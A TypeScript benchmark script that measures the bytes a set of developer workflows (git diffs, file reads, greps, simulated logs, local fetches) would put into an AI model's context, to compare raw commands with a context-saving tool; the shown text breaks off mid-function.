// Workflow per-step raw native baseline. For each step in each workflow,
// runs the equivalent "no-context-mode" operation (cat / node -e / bash /
// curl / grep) and records the bytes that would have hit Claude's context.
//
// Pairs with workflows-*.json + serena-baseline-*.json + raw-baseline-*.json
// to produce the full per-step 5-way breakout (raw / upstream / fork /
// upstream+serena / fork+serena) in tokens-*.md.
//
// Output: build/compare/workflow-raw-baseline-<ts>.{json,md}

import { spawnSync } from "node:child_process";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { startFixtureServer } from "./fixture-server.js";
import { buildMeta, reportDir } from "./lib.js";
import { CHARS_PER_TOKEN, estimateTokens } from "./token-accounting.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "..", "..");

interface StepRaw {
  label: string;
  tool: string;
  rawEquivalent: string;
  rawBytes: number;
  rawTokens: number;
}

interface WorkflowRaw {
  workflow: string;
  steps: StepRaw[];
  totalBytes: number;
  totalTokens: number;
}

function rawCat(path: string): number {
  return readFileSync(path).length;
}

function rawHeadLines(path: string, n: number): number {
  return Buffer.byteLength(readFileSync(path, "utf8").split("\n").slice(0, n).join("\n"), "utf8");
}

function rawNodeExec(code: string): number {
  const r = spawnSync(process.execPath, ["-e", code], { encoding: "buffer" });
  return (r.stdout?.length ?? 0) + (r.stderr?.length ?? 0);
}

function rawShellEcho(cmd: string): number {
  const r = spawnSync(cmd, { shell: true, encoding: "buffer", cwd: repoRoot });
  return (r.stdout?.length ?? 0) + (r.stderr?.length ?? 0);
}

function rawBatch(commands: string[]): number {
  let total = 0;
  for (const c of commands) total += rawShellEcho(c);
  return total;
}

async function rawHttpGet(url: string): Promise<number> {
  return new Promise((resolve, reject) => {
    httpRequest(url, (res) => {
      let bytes = 0;
      res.on("data", (chunk: Buffer) => { bytes += chunk.length; });
      res.on("end", () => resolve(bytes));
      res.on("error", reject);
    }).on("error", reject).end();
  });
}

function rawGrepText(corpus: string, patterns: RegExp[]): number {
  // Union match across patterns. Returns bytes of matching lines joined.
  const matches: string[] = [];
  for (const line of corpus.split("\n")) {
    if (patterns.some((p) => p.test(line))) matches.push(line);
  }
  return Buffer.byteLength(matches.join("\n"), "utf8");
}

function rawGrepRepo(patterns: string[], dir: string): number {
  // Simulate grep -r over a directory: bytes of all matching lines, capped at
  // some practical limit to avoid pathological size.
  const args = ["-r", "-I", "--exclude-dir=.git", "--exclude-dir=node_modules", "--exclude-dir=build"];
  for (const p of patterns) args.push("-e", p);
  args.push(dir);
  const r = spawnSync("grep", args, { encoding: "buffer", cwd: repoRoot });
  return (r.stdout?.length ?? 0);
}

// ---- workflow definitions (mirror tests/compare/workflows/*.ts) ----

async function bugHuntRaw(): Promise<StepRaw[]> {
  const serverPath = join(repoRoot, "src", "server.ts");
  // route-git-diff: no native equivalent for "classify command". User would
  // just run `git diff main` directly → full diff hits context.
  const gitDiffMain = rawShellEcho("git diff main");
  // batch-git-context: 3 git commands run via Bash. ctx_search queries have
  // no native equivalent (no FTS), grep the batch output for those terms.
  const gitCommands = [
    "git status --porcelain",
    "git log --oneline -20",
    "git diff main --stat",
  ];
  const batchOut = (() => {
    let out = "";
    for (const c of gitCommands) {
      const r = spawnSync(c, { shell: true, encoding: "utf8", cwd: repoRoot });
      out += (r.stdout || "") + (r.stderr || "");
    }
    return out;
  })();
  const batchBytes = Buffer.byteLength(batchOut, "utf8");
  // search-errors over the prior batch output (no FTS infra → fallback = grep).
  const searchErrors = rawGrepText(batchOut, [/error/i, /modified/i, /recent/i]);
  const readServer = rawCat(serverPath);
  const versionCheck = rawShellEcho("node --version && npm --version");
  return [
    { label: "route-git-diff", tool: "ctx_route", rawEquivalent: "git diff main", rawBytes: gitDiffMain, rawTokens: estimateTokens(gitDiffMain) },
    { label: "batch-git-context", tool: "ctx_batch_execute", rawEquivalent: "git status + git log -20 + git diff --stat", rawBytes: batchBytes, rawTokens: estimateTokens(batchBytes) },
    { label: "search-errors", tool: "ctx_search", rawEquivalent: "grep -E 'error|modified|recent' <batch output>", rawBytes: searchErrors, rawTokens: estimateTokens(searchErrors) },
    { label: "read-server-outline", tool: "ctx_read", rawEquivalent: `cat src/server.ts`, rawBytes: readServer, rawTokens: estimateTokens(readServer) },
    { label: "execute-version-check", tool: "ctx_execute", rawEquivalent: "node --version && npm --version", rawBytes: versionCheck, rawTokens: estimateTokens(versionCheck) },
  ];
}

async function codebaseExploreRaw(): Promise<StepRaw[]> {
  const storePath = join(repoRoot, "src", "store.ts");
  const storeBytes = rawCat(storePath);
  const sliceBytes = rawHeadLines(storePath, 120);
  // search across repo src/ for ContentStore + search + index
  const grepBytes = rawGrepRepo(["ContentStore", "search", "index"], join(repoRoot, "src"));
  // Practical cap — Claude wouldn't actually ingest unbounded grep output.
  // Apply the same cap context-mode would apply (~32KB) so the comparison is fair.
  const cappedGrep = Math.min(grepBytes, 32 * 1024);
  return [
    { label: "map", tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: storeBytes, rawTokens: estimateTokens(storeBytes) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: storeBytes, rawTokens: estimateTokens(storeBytes) },
    { label: "symbols", tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: storeBytes, rawTokens: estimateTokens(storeBytes) },
    { label: "search", tool: "ctx_search", rawEquivalent: "grep -r 'ContentStore|search|index' src/ (capped 32KB)", rawBytes: cappedGrep, rawTokens: estimateTokens(cappedGrep) },
    { label: "slice", tool: "ctx_read", rawEquivalent: "head -n 120 src/store.ts", rawBytes: sliceBytes, rawTokens: estimateTokens(sliceBytes) },
  ];
}

async function debugTestRaw(): Promise<StepRaw[]> {
  const storePath = join(repoRoot, "src", "store.ts");
  const simulateVitest = `
const failures = [
  { file: "tests/store.test.ts", name: "ContentStore stores rows", err: "Expected 1, received 0" },
  { file: "tests/runtime.test.ts", name: "detects bun runtime", err: "missing runtime" },
];
console.log("[vitest] running...");
for (const f of failures) {
  console.log("FAIL  " + f.file + " > " + f.name);
  console.log("       AssertionError: " + f.err);
}
console.log("[vitest] 2 failed | 47 passed");
`;
  const simBytes = rawNodeExec(simulateVitest);
  // search FAIL/AssertionError over the simulated output
  const simOut = (() => {
    const r = spawnSync(process.execPath, ["-e", simulateVitest], { encoding: "utf8" });
    return (r.stdout || "") + (r.stderr || "");
  })();
  const searchBytes = rawGrepText(simOut, [/FAIL/, /AssertionError/]);
  const storeBytes = rawCat(storePath);
  return [
    { label: "simulate-vitest", tool: "ctx_execute", rawEquivalent: "node -e <simulate vitest code>", rawBytes: simBytes, rawTokens: estimateTokens(simBytes) },
    { label: "search-fail", tool: "ctx_search", rawEquivalent: "grep -E 'FAIL|AssertionError' <vitest output>", rawBytes: searchBytes, rawTokens: estimateTokens(searchBytes) },
    { label: "read-store-outline", tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: storeBytes, rawTokens: estimateTokens(storeBytes) },
  ];
}

async function docLookupRaw(): Promise<StepRaw[]> {
  const server = await startFixtureServer();
  try {
    const reactBytes = await rawHttpGet(server.url("/docs/react-useEffect"));
    const nextBytes = await rawHttpGet(server.url("/docs/nextjs"));
    // search across combined corpus by fetching once more for the corpus body
    const reactDoc = await new Promise<string>((resolve, reject) => {
      httpRequest(server.url("/docs/react-useEffect"), (res) => {
        let buf = "";
        res.on("data", (c: Buffer) => { buf += c.toString("utf8"); });
        res.on("end", () => resolve(buf));
        res.on("error", reject);
      }).on("error", reject).end();
    });
    const nextDoc = await new Promise<string>((resolve, reject) => {
      httpRequest(server.url("/docs/nextjs"), (res) => {
        let buf = "";
        res.on("data", (c: Buffer) => { buf += c.toString("utf8"); });
        res.on("end", () => resolve(buf));
        res.on("error", reject);
      }).on("error", reject).end();
    });
    const corpus = reactDoc + "\n" + nextDoc;
    const searchEffect = rawGrepText(corpus, [/useEffect dependencies/i]);
    const searchSC = rawGrepText(corpus, [/server component/i]);
    return [
      { label: "fetch-react", tool: "ctx_fetch_and_index", rawEquivalent: "curl /docs/react-useEffect", rawBytes: reactBytes, rawTokens: estimateTokens(reactBytes) },
      { label: "fetch-nextjs", tool: "ctx_fetch_and_index", rawEquivalent: "curl /docs/nextjs", rawBytes: nextBytes, rawTokens: estimateTokens(nextBytes) },
      { label: "search-useEffect", tool: "ctx_search", rawEquivalent: "grep 'useEffect dependencies' <both docs>", rawBytes: searchEffect, rawTokens: estimateTokens(searchEffect) },
      { label: "search-server-component", tool: "ctx_search", rawEquivalent: "grep 'server component' <both docs>", rawBytes: searchSC, rawTokens: estimateTokens(searchSC) },
    ];
  } finally {
    await server.close();
  }
}

async function logTriageRaw(): Promise<StepRaw[]> {
  const generateLogs = `
const types = ["INFO", "WARN", "ERROR", "DEBUG"];
for (let i = 0; i < 500; i++) {
  const t = types[i % types.length];
  console.log("[" + t + "] line " + i + " message-token-" + (i % 11));
}
`;
  const countErrors = `
const types = ["INFO", "WARN", "ERROR", "DEBUG"];
const counts = {};
for (let i = 0; i < 500; i++) {
  const t = types[i % types.length];
  counts[t] = (counts[t] || 0) + 1;
}
console.log(JSON.stringify(counts));
`;
  const genBytes = rawNodeExec(generateLogs);
  const countBytes = rawNodeExec(countErrors);
  // search "ERROR line" over the generate-logs stdout
  const logsOut = (() => {
    const r = spawnSync(process.execPath, ["-e", generateLogs], { encoding: "utf8" });
    return (r.stdout || "") + (r.stderr || "");
  })();
  const searchBytes = rawGrepText(logsOut, [/ERROR.*line/]);
  return [
    { label: "generate-logs", tool: "ctx_execute", rawEquivalent: "node -e <generate logs>", rawBytes: genBytes, rawTokens: estimateTokens(genBytes) },
    { label: "count-by-level", tool: "ctx_execute", rawEquivalent: "node -e <count by level>", rawBytes: countBytes, rawTokens: estimateTokens(countBytes) },
    { label: "search-errors", tool: "ctx_search", rawEquivalent: "grep 'ERROR.*line' <logs>", rawBytes: searchBytes, rawTokens: estimateTokens(searchBytes) },
  ];
}

// ---- new workflows (markdown / configs / bundle / diff / control) ----

async function markdownOutlineRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "docs", "FORK_HANDOFF.md");
  const full = rawCat(p);
  const sliceHead = rawHeadLines(p, 60);
  const lines = readFileSync(p, "utf8").split("\n");
  const sliceMid = Buffer.byteLength(lines.slice(59, 140).join("\n"), "utf8");
  return [
    { label: "map",     tool: "ctx_read", rawEquivalent: "cat docs/FORK_HANDOFF.md", rawBytes: full, rawTokens: estimateTokens(full) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat docs/FORK_HANDOFF.md", rawBytes: full, rawTokens: estimateTokens(full) },
    { label: "slice-head",   tool: "ctx_read", rawEquivalent: "sed -n 1,60p docs/FORK_HANDOFF.md",   rawBytes: sliceHead, rawTokens: estimateTokens(sliceHead) },
    { label: "slice-middle", tool: "ctx_read", rawEquivalent: "sed -n 60,140p docs/FORK_HANDOFF.md", rawBytes: sliceMid,  rawTokens: estimateTokens(sliceMid) },
  ];
}

async function instructionConfigRaw(): Promise<StepRaw[]> {
  const codex = join(repoRoot, "configs", "codex", "AGENTS.md");
  const openclaw = join(repoRoot, "configs", "openclaw", "AGENTS.md");
  const codexBytes = rawCat(codex);
  const openclawBytes = rawCat(openclaw);
  // Run the same diff JS as the workflow to get true equivalent bytes.
  const diffCode = `
const fs = require("node:fs");
const a = fs.readFileSync(${JSON.stringify(codex)}, "utf8").split("\\n");
const b = fs.readFileSync(${JSON.stringify(openclaw)}, "utf8").split("\\n");
const ah = new Set(a.filter(l => /^#{1,3} /.test(l)));
const bh = new Set(b.filter(l => /^#{1,3} /.test(l)));
const onlyA = [...ah].filter(x => !bh.has(x));
const onlyB = [...bh].filter(x => !ah.has(x));
console.log("codex-only headings:", onlyA.length);
for (const h of onlyA) console.log("  + " + h);
console.log("openclaw-only headings:", onlyB.length);
for (const h of onlyB) console.log("  - " + h);
`;
  const diffBytes = rawNodeExec(diffCode);
  return [
    { label: "read-codex-outline",    tool: "ctx_read",    rawEquivalent: "cat configs/codex/AGENTS.md",    rawBytes: codexBytes,    rawTokens: estimateTokens(codexBytes) },
    { label: "read-openclaw-outline", tool: "ctx_read",    rawEquivalent: "cat configs/openclaw/AGENTS.md", rawBytes: openclawBytes, rawTokens: estimateTokens(openclawBytes) },
    { label: "diff-headings",         tool: "ctx_execute", rawEquivalent: "node -e <heading diff>",          rawBytes: diffBytes,     rawTokens: estimateTokens(diffBytes) },
  ];
}

async function largeFileSliceRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "docs", "rtk-inspired-context-mode-spec - Copy.md");
  const full = rawCat(p);
  const lines = readFileSync(p, "utf8").split("\n");
  const early = Buffer.byteLength(lines.slice(0, 120).join("\n"), "utf8");
  const mid = Buffer.byteLength(lines.slice(399, 520).join("\n"), "utf8");
  return [
    { label: "outline",      tool: "ctx_read", rawEquivalent: "cat docs/rtk-inspired-...md (~72KB)", rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "slice-early",  tool: "ctx_read", rawEquivalent: "sed -n 1,120p",                       rawBytes: early, rawTokens: estimateTokens(early) },
    { label: "slice-middle", tool: "ctx_read", rawEquivalent: "sed -n 400,520p",                     rawBytes: mid,   rawTokens: estimateTokens(mid) },
  ];
}

async function bundleSearchRaw(): Promise<StepRaw[]> {
  const bundle = join(repoRoot, "server.bundle.mjs");
  const searchCode = `
const fs = require("node:fs");
const buf = fs.readFileSync(${JSON.stringify(bundle)}, "utf8");
const needles = ["ctx_diff", "ctx_route", "ctx_gain"];
for (const n of needles) {
  let i = 0, hits = 0;
  while ((i = buf.indexOf(n, i)) !== -1) { hits++; i += n.length; }
  console.log(n + ": " + hits + " occurrence(s)");
}
console.log("bundle bytes: " + buf.length);
`;
  const bytes = rawNodeExec(searchCode);
  return [
    { label: "count-tokens", tool: "ctx_execute", rawEquivalent: "node -e <count ctx_* in bundle>", rawBytes: bytes, rawTokens: estimateTokens(bytes) },
  ];
}

async function bundleToolListRaw(): Promise<StepRaw[]> {
  const bundle = join(repoRoot, "server.bundle.mjs");
  const extractCode = `
const fs = require("node:fs");
const buf = fs.readFileSync(${JSON.stringify(bundle)}, "utf8");
const re = /name:\\s*"(ctx_[a-z_]+)"/g;
const found = new Set();
let m;
while ((m = re.exec(buf)) !== null) found.add(m[1]);
const sorted = [...found].sort();
console.log("registered ctx_* tools: " + sorted.length);
for (const t of sorted) console.log("  " + t);
console.log("ctx_diff present? " + sorted.includes("ctx_diff"));
`;
  const bytes = rawNodeExec(extractCode);
  return [
    { label: "extract-tools", tool: "ctx_execute", rawEquivalent: "node -e <extract tool registry>", rawBytes: bytes, rawTokens: estimateTokens(bytes) },
  ];
}

async function noisySidecarRaw(): Promise<StepRaw[]> {
  // route step has no native equivalent — user runs the original command directly.
  // Simulate the deterministic output instead of executing (cmd.exe on Windows
  // does not understand `for i in $(seq ...); do ...` bash syntax, returning 0
  // bytes and skewing the comparison). Output mirrors the workflow's shell loop.
  let simulated = "";
  for (let i = 1; i <= 200; i++) {
    simulated += `[trace] iteration ${i} alpha bravo charlie token-${i}\n`;
  }
  simulated += "ERROR final marker\n";
  const noisyBytes = Buffer.byteLength(simulated, "utf8");
  // fetch-latest-run native equivalent = re-run the command (no sidecar).
  return [
    { label: "route",                tool: "ctx_route",     rawEquivalent: "bash <command directly>", rawBytes: noisyBytes, rawTokens: estimateTokens(noisyBytes) },
    { label: "execute-with-intent",  tool: "ctx_execute",   rawEquivalent: "bash <command>",          rawBytes: noisyBytes, rawTokens: estimateTokens(noisyBytes) },
    { label: "fetch-latest-run",     tool: "ctx_fetch_run", rawEquivalent: "re-run the command",      rawBytes: noisyBytes, rawTokens: estimateTokens(noisyBytes) },
  ];
}

async function statsBelievabilityRaw(): Promise<StepRaw[]> {
  const storePath = join(repoRoot, "src", "store.ts");
  const storeBytes = rawCat(storePath);
  const searchCode = `for (let i=0;i<50;i++) console.log('line ' + i);`;
  const searchBytes = rawNodeExec(searchCode);
  const grepStoreBytes = rawGrepText(readFileSync(storePath, "utf8"), [/ContentStore/]);
  return [
    { label: "warm-read",    tool: "ctx_read",     rawEquivalent: "cat src/store.ts",                rawBytes: storeBytes,     rawTokens: estimateTokens(storeBytes) },
    { label: "warm-search",  tool: "ctx_search",   rawEquivalent: "grep ContentStore src/store.ts",  rawBytes: grepStoreBytes, rawTokens: estimateTokens(grepStoreBytes) },
    { label: "warm-execute", tool: "ctx_execute",  rawEquivalent: "node -e <50 lines>",              rawBytes: searchBytes,    rawTokens: estimateTokens(searchBytes) },
    { label: "gain",     tool: "ctx_gain",     rawEquivalent: "(no native equivalent)", rawBytes: 0, rawTokens: 0 },
    { label: "discover", tool: "ctx_discover", rawEquivalent: "(no native equivalent)", rawBytes: 0, rawTokens: 0 },
    { label: "stats",    tool: "ctx_stats",    rawEquivalent: "(no native equivalent)", rawBytes: 0, rawTokens: 0 },
  ];
}

async function brokenCodeRaw(): Promise<StepRaw[]> {
  // Mirror the BROKEN_SOURCE constant in workflows/broken-code.ts.
  const BROKEN_SOURCE = `// Deliberately broken TypeScript-ish source.
export class Half {
  constructor(public x: number {  // missing closing paren on parameter
    this.x = x
  }

  greet(name: string  // missing closing paren
    return "hi " + name
  }
}

const stray = (
function unfinished(

interface Lonely {
  field: stringNoSemiNoBrace

// Trailing junk to confuse parsers further.
@@@ !!! ###
`;
  const full = Buffer.byteLength(BROKEN_SOURCE, "utf8");
  const sliceBytes = Buffer.byteLength(BROKEN_SOURCE.split("\n").slice(0, 30).join("\n"), "utf8");
  return [
    { label: "map",     tool: "ctx_read", rawEquivalent: "cat broken.ts", rawBytes: full,        rawTokens: estimateTokens(full) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat broken.ts", rawBytes: full,        rawTokens: estimateTokens(full) },
    { label: "slice",   tool: "ctx_read", rawEquivalent: "head -30 broken.ts", rawBytes: sliceBytes, rawTokens: estimateTokens(sliceBytes) },
  ];
}

async function crossFileCountRaw(): Promise<StepRaw[]> {
  // Native equivalent = the JS that we'd otherwise run via ctx_execute.
  // Bytes = the actual stdout of that script.
  const code = `
const fs = require("node:fs");
const path = require("node:path");
const roots = [
  ${JSON.stringify(join(repoRoot, "docs"))},
  ${JSON.stringify(join(repoRoot, "configs"))},
];
const needle = "ctx_diff";
const hits = [];
function walk(dir) {
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
  for (const e of entries) {
    const full = path.join(dir, e.name);
    if (e.isDirectory()) walk(full);
    else if (e.isFile() && /\\.(md|mdc|json|ya?ml|toml)$/.test(e.name)) {
      let buf;
      try { buf = fs.readFileSync(full, "utf8"); } catch { continue; }
      const lines = buf.split("\\n");
      const found = lines.filter(l => l.includes(needle)).length;
      if (found > 0) hits.push({ file: path.relative(${JSON.stringify(repoRoot)}, full), count: found });
    }
  }
}
for (const r of roots) walk(r);
hits.sort((a, b) => b.count - a.count);
console.log("files mentioning " + needle + ": " + hits.length);
for (const h of hits) console.log("  " + h.count + "  " + h.file);
`;
  const bytes = rawNodeExec(code);
  return [
    { label: "scan-docs-and-configs", tool: "ctx_execute", rawEquivalent: "node -e <walk docs+configs>", rawBytes: bytes, rawTokens: estimateTokens(bytes) },
  ];
}

async function semanticNavControlRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "src", "diff", "git-text.ts");
  const full = rawCat(p);
  const refsGrep = rawGrepRepo(["renderDiffSummary"], join(repoRoot, "src"));
  const refsCapped = Math.min(refsGrep, 32 * 1024);
  return [
    { label: "outline-source", tool: "ctx_read",   rawEquivalent: "cat src/diff/git-text.ts",                rawBytes: full,        rawTokens: estimateTokens(full) },
    { label: "find-symbol",    tool: "ctx_read",   rawEquivalent: "cat src/diff/git-text.ts",                rawBytes: full,        rawTokens: estimateTokens(full) },
    { label: "search-refs",    tool: "ctx_search", rawEquivalent: "grep -r renderDiffSummary src/ (capped)", rawBytes: refsCapped,  rawTokens: estimateTokens(refsCapped) },
  ];
}

async function ctxDiffBranchRaw(): Promise<StepRaw[]> {
  const head1 = rawShellEcho("git diff HEAD~1 HEAD");
  const head3 = rawShellEcho("git diff HEAD~3 HEAD");
  return [
    { label: "head-vs-head-1", tool: "ctx_diff", rawEquivalent: "git diff HEAD~1 HEAD", rawBytes: head1, rawTokens: estimateTokens(head1) },
    { label: "head-vs-head-3", tool: "ctx_diff", rawEquivalent: "git diff HEAD~3 HEAD", rawBytes: head3, rawTokens: estimateTokens(head3) },
  ];
}

async function ctxDiffSummaryRaw(): Promise<StepRaw[]> {
  const head1 = rawShellEcho("git diff HEAD~1 HEAD");
  const head3 = rawShellEcho("git diff HEAD~3 HEAD");
  return [
    { label: "summary-head-vs-head-1",     tool: "ctx_diff", rawEquivalent: "git diff HEAD~1 HEAD", rawBytes: head1, rawTokens: estimateTokens(head1) },
    { label: "summary-risk-head-vs-head-3", tool: "ctx_diff", rawEquivalent: "git diff HEAD~3 HEAD", rawBytes: head3, rawTokens: estimateTokens(head3) },
  ];
}

// ---- second batch (Tier 1 + 2 + 3) raw equivalents ----

const NOISY_JS_2 = `
const codes = ["INFO", "WARN", "ERROR", "DEBUG", "TRACE"];
for (let i = 0; i < 400; i++) {
  const c = codes[i % codes.length];
  console.log("[" + c + "] event " + i + " thing-" + (i % 17) + " token-rare-" + (i % 53));
}
console.log("SUMMARY: 400 events, marker-found-once-only");
`;

async function sidecarFollowupRaw(): Promise<StepRaw[]> {
  const noisy = rawNodeExec(NOISY_JS_2);
  const stdout = (() => {
    const r = spawnSync(process.execPath, ["-e", NOISY_JS_2], { encoding: "utf8" });
    return (r.stdout || "") + (r.stderr || "");
  })();
  const grepBytes = rawGrepText(stdout, [/SUMMARY/, /marker-found-once-only/]);
  return [
    { label: "run-noisy",       tool: "ctx_execute",   rawEquivalent: "node -e <noisy>",                rawBytes: noisy,    rawTokens: estimateTokens(noisy) },
    { label: "search-summary",  tool: "ctx_search",    rawEquivalent: "grep SUMMARY <stdout>",          rawBytes: grepBytes, rawTokens: estimateTokens(grepBytes) },
    { label: "fetch-raw",       tool: "ctx_fetch_run", rawEquivalent: "re-run the command",             rawBytes: noisy,    rawTokens: estimateTokens(noisy) },
  ];
}

async function ctxDiffStatVariantsRaw(): Promise<StepRaw[]> {
  const fullDiff = rawShellEcho("git diff HEAD~3 HEAD");
  const stat = rawShellEcho("git diff HEAD~3 HEAD --stat");
  const nameStatus = rawShellEcho("git diff HEAD~3 HEAD --name-status");
  // Treat default + summary + risk all against the most-detailed raw output.
  return [
    { label: "ctx-diff-default", tool: "ctx_diff", rawEquivalent: "git diff HEAD~3 HEAD",                rawBytes: fullDiff, rawTokens: estimateTokens(fullDiff) },
    { label: "ctx-diff-summary", tool: "ctx_diff", rawEquivalent: "git diff HEAD~3 HEAD --stat",         rawBytes: stat,     rawTokens: estimateTokens(stat) },
    { label: "ctx-diff-risk",    tool: "ctx_diff", rawEquivalent: "git diff HEAD~3 HEAD --name-status",  rawBytes: nameStatus, rawTokens: estimateTokens(nameStatus) },
  ];
}

async function compactVsSerenaMdRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "docs", "FORK_HANDOFF.md");
  const full = rawCat(p);
  const slice = rawHeadLines(p, 40);
  return [
    { label: "map",       tool: "ctx_read", rawEquivalent: "cat docs/FORK_HANDOFF.md",         rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "outline",   tool: "ctx_read", rawEquivalent: "cat docs/FORK_HANDOFF.md",         rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "slice-top", tool: "ctx_read", rawEquivalent: "head -40 docs/FORK_HANDOFF.md",    rawBytes: slice, rawTokens: estimateTokens(slice) },
  ];
}

async function compactVsSerenaJsonRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "package.json");
  const full = rawCat(p);
  // extract-deps native code (same as workflow but inline here)
  const code = `
const fs = require("node:fs");
const pkg = JSON.parse(fs.readFileSync(${JSON.stringify(p)}, "utf8"));
const deps = Object.keys(pkg.dependencies || {}).sort();
const dev = Object.keys(pkg.devDependencies || {}).sort();
console.log("dep count:", deps.length);
console.log("dev count:", dev.length);
console.log("deps:", deps.join(", "));
console.log("devDeps:", dev.join(", "));
`;
  const exec = rawNodeExec(code);
  return [
    { label: "map",          tool: "ctx_read",    rawEquivalent: "cat package.json",                  rawBytes: full, rawTokens: estimateTokens(full) },
    { label: "outline",      tool: "ctx_read",    rawEquivalent: "cat package.json",                  rawBytes: full, rawTokens: estimateTokens(full) },
    { label: "extract-deps", tool: "ctx_execute", rawEquivalent: "node -e <extract deps>",            rawBytes: exec, rawTokens: estimateTokens(exec) },
  ];
}

async function compactVsSerenaBundleRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "server.bundle.mjs");
  const full = rawCat(p);
  const code = `const fs = require("node:fs"); const buf = fs.readFileSync(${JSON.stringify(p)}, "utf8"); let i = 0, hits = 0; while ((i = buf.indexOf("ctx_diff", i)) !== -1) { hits++; i += 8; } console.log("ctx_diff hits:", hits);`;
  const exec = rawNodeExec(code);
  return [
    { label: "map",           tool: "ctx_read",    rawEquivalent: "cat server.bundle.mjs (~770KB)",   rawBytes: full, rawTokens: estimateTokens(full) },
    { label: "grep-ctx_diff", tool: "ctx_execute", rawEquivalent: "node -e <count ctx_diff>",         rawBytes: exec, rawTokens: estimateTokens(exec) },
  ];
}

const BROKEN_HYBRID = `// Broken-ish hybrid: JS-flavored with stray TS, unclosed blocks.
import { unknown from "./missing-module";

export class Partial {
  greet(name: string  // unclosed paren
    return "hi " + name
  }
}

declare const stray: any = (
function noBody(

interface Lonely {
  field: stringNoSemiNoBrace

@@@ trailing !!! junk ###
`;
async function compactVsSerenaBrokenRaw(): Promise<StepRaw[]> {
  const full = Buffer.byteLength(BROKEN_HYBRID, "utf8");
  const sliceBytes = Buffer.byteLength(BROKEN_HYBRID.split("\n").slice(0, 12).join("\n"), "utf8");
  return [
    { label: "map",        tool: "ctx_read", rawEquivalent: "cat broken-hybrid.ts", rawBytes: full,       rawTokens: estimateTokens(full) },
    { label: "outline",    tool: "ctx_read", rawEquivalent: "cat broken-hybrid.ts", rawBytes: full,       rawTokens: estimateTokens(full) },
    { label: "slice-head", tool: "ctx_read", rawEquivalent: "head -12 broken-hybrid.ts", rawBytes: sliceBytes, rawTokens: estimateTokens(sliceBytes) },
  ];
}

async function smallOutputGuardrailRaw(): Promise<StepRaw[]> {
  const echoBytes = rawShellEcho("echo hi");
  const pwdBytes = rawShellEcho("pwd");
  const nodeVer = rawShellEcho("node --version");
  return [
    { label: "route-echo-hi",    tool: "ctx_route", rawEquivalent: "echo hi",         rawBytes: echoBytes, rawTokens: estimateTokens(echoBytes) },
    { label: "route-pwd",        tool: "ctx_route", rawEquivalent: "pwd",             rawBytes: pwdBytes,  rawTokens: estimateTokens(pwdBytes) },
    { label: "route-node-version", tool: "ctx_route", rawEquivalent: "node --version", rawBytes: nodeVer,   rawTokens: estimateTokens(nodeVer) },
  ];
}

async function cacheHitDedupRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "src", "store.ts");
  const b = rawCat(p);
  return [
    { label: "first-read",  tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: b, rawTokens: estimateTokens(b) },
    { label: "second-read", tool: "ctx_read", rawEquivalent: "cat src/store.ts", rawBytes: b, rawTokens: estimateTokens(b) },
  ];
}

async function binaryRefusalRaw(): Promise<StepRaw[]> {
  // The workflow writes a 2048-byte binary. Raw = full blob bytes for map,
  // and "head" of 20 lines on binary is undefined — call it 0 (user gets
  // nothing meaningful).
  return [
    { label: "map-binary",   tool: "ctx_read", rawEquivalent: "cat blob.gz",       rawBytes: 2048, rawTokens: estimateTokens(2048) },
    { label: "slice-binary", tool: "ctx_read", rawEquivalent: "head -20 blob.gz",  rawBytes: 0,    rawTokens: 0 },
  ];
}

async function networkFailureRaw(): Promise<StepRaw[]> {
  // curl to closed port returns an error string of ~80 bytes on most platforms.
  const r = spawnSync("curl", ["-sS", "--max-time", "2", "http://127.0.0.1:1/nope"], { encoding: "buffer" });
  const bytes = (r.stdout?.length ?? 0) + (r.stderr?.length ?? 0);
  return [
    { label: "fetch-closed-port", tool: "ctx_fetch_and_index", rawEquivalent: "curl http://127.0.0.1:1/nope", rawBytes: bytes, rawTokens: estimateTokens(bytes) },
  ];
}

async function multiFileRefactorRaw(): Promise<StepRaw[]> {
  const fStore = join(repoRoot, "src", "store.ts");
  const fRuntime = join(repoRoot, "src", "runtime.ts");
  const fServer = join(repoRoot, "src", "server.ts");
  const storeB = rawCat(fStore);
  const runtimeB = rawCat(fRuntime);
  const serverB = rawCat(fServer);
  const code = `
const fs = require("node:fs");
const files = [${JSON.stringify(fStore)}, ${JSON.stringify(fRuntime)}, ${JSON.stringify(fServer)}];
let total = 0, exports = 0, classes = 0;
for (const f of files) {
  const buf = fs.readFileSync(f, "utf8");
  total += buf.length;
  exports += (buf.match(/export\\s+(function|class|const|interface)/g) || []).length;
  classes += (buf.match(/^class\\s|^export\\s+class\\s/gm) || []).length;
}
console.log("total bytes:", total);
console.log("exports:", exports);
console.log("classes:", classes);
console.log("suggestion: review largest file first");
`;
  const exec = rawNodeExec(code);
  return [
    { label: "read-store",   tool: "ctx_read",    rawEquivalent: "cat src/store.ts",   rawBytes: storeB,   rawTokens: estimateTokens(storeB) },
    { label: "read-runtime", tool: "ctx_read",    rawEquivalent: "cat src/runtime.ts", rawBytes: runtimeB, rawTokens: estimateTokens(runtimeB) },
    { label: "read-server",  tool: "ctx_read",    rawEquivalent: "cat src/server.ts",  rawBytes: serverB,  rawTokens: estimateTokens(serverB) },
